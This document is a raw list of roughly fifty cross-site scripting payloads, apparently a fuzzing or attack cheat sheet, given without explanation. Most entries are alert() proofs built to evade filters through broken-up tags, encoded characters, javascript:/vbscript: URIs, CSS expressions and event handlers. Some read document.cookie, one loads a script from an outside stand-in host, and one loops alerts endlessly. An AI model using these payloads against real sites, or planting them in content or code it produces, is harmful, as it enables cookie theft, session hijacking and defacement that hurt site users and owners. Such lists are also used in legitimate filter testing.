````js
<script>alert(1);</script>
<script>alert('XSS');</script>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=javascript:alert('XSS')>
<scr<script>ipt>alert('XSS');</scr</script>ipt>
'><script>alert(0)</script>
<img src=foo.png onerror=alert(/xssed/) />
<img src=foo.png onerror=alert(/xssed/) />
<style>@im\port'\ja\vasc\ript:alert(\"XSS\")';</style>
<? echo('<scr)'; echo('ipt>alert(\"XSS\")</script>'); ?>
<marquee><script>alert('XSS')</script></marquee>
<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">
<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">
<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">
<script src=http://yoursite.com/your_files.js></script>
</title><script>alert(/xss/)</script>
</textarea><script>alert(/xss/)</script>
<IMG LOWSRC=\"javascript:alert('XSS')\">
 <IMG DYNSRC=\"javascript:alert('XSS')\">
<font style='color:expression(alert(document.cookie))'>
<img src=javascript:alert('XSS')>
<script language=JavaScript>alert('XSS')</script>
<svg/onload=alert%26%23x00000000028;%27xss%27%26%23x00000000029;>
<body onunload=javascript:alert('XSS');>
<body onLoad='alert('XSS');'
[color=red' onmouseover='alert('xss')']mouse over[/color]
'/></a></><img src=1.gif onerror=alert(1)>
window.alert('Bonjour !');
<div style='x:expression((window.r==1)?'':eval('r=1;
<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>
'>><marquee><h1>XSS</h1></marquee>
<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">
<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">
<script>var var = 1; alert(var)</script>
<STYLE type='text/css'>BODY{background:url('javascript:alert('XSS')')}</STYLE>
<?='<SCRIPT>alert('XSS')</SCRIPT>'?>
<IMG SRC='vbscript:msgbox(\"XSS\")'>
' onfocus=alert(document.domain) '> <'
<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>
<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS
[color=red width=expression(alert(123))][color]
<BASE HREF='javascript:alert('XSS');//'>
<br size=\"&{alert('XSS')}\">
</script><script>alert(1)</script>
'><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert('XSS')>
Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
<body onLoad='while(true) alert('XSS');'>
''></title><script>alert(1111)</script>
</textarea>''><script>alert(document.cookie)</script>
data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
````
